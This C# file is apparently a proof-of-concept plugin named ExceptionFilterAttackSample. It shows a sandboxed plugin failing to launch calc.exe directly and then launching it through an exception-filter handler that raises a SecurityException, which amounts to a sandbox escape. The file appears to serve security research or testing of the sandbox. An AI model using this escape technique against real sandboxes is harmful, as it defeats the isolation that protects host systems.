using System;
using System.Security;
using Sandbox.Core.API;
using VBLibrary;

namespace Sandbox.Plugin
{
    public class ExceptionFilterAttackSample : IPlugin
    {
        public void Run()
        {
            var executionHelper = new ExecutionHelper("calc");
            var executionFunc = executionHelper.GetExecuteFunc();
            Console.WriteLine("==========================================================="); 

            try
            {
                executionFunc();
            }
            catch (Exception exception)
            {
                Console.WriteLine("Fail run calc.exe: {0}", exception.Message);
            }
            
            Console.WriteLine("===========================================================");
            Console.ReadLine();
            Console.WriteLine("==========================================================="); 

            var exceptionHandler = new ExceptionHandler(
                () =>
                {
                    new SecurityException("", null, null, null, new object(), null);
                },
                executionFunc, 
                () => {});

            exceptionHandler.Execute();
            Console.WriteLine("Success run calc.exe");
            Console.WriteLine("===========================================================");
            Console.WriteLine("\n");
        }

    }
}